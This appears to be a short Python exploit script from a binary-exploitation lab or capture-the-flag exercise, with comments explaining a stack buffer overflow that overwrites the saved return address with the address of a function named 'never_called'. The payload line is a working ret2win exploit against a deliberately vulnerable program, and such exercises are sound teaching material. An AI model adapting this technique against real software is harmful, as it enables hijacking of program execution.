# Taking the address 0x080486fb of where the function "never_called" is located
# We overflow the buffer with 100 A's for the 100 byte buffer, 4 A's for the 
# char smallbuffer declaration, 4 B's for the base pointer EBP, and finally 
# we put the address of "never_called" in Little Endian format so we can 
# write that into the return address at the bottom.

print ("A"*0x6c + "BBBB" + "\xfb\x86\x04\x08")
